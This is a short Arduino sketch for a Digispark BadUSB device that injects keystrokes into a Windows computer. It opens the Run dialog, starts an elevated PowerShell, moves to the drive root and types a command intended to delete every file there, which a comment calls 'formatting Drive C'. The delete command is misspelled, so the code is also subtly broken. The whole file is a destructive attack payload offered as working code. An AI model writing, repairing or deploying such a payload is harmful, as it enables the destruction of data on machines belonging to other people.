#include<DigiKeyboard.h>

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // formatting Drive C
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd ../..");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("Rmove-Item ./* ");
  digitalWrite(1, HIGH); // it will show an extra red light when program is done
  for(;;){
    //Nothing Here for you
  }

}
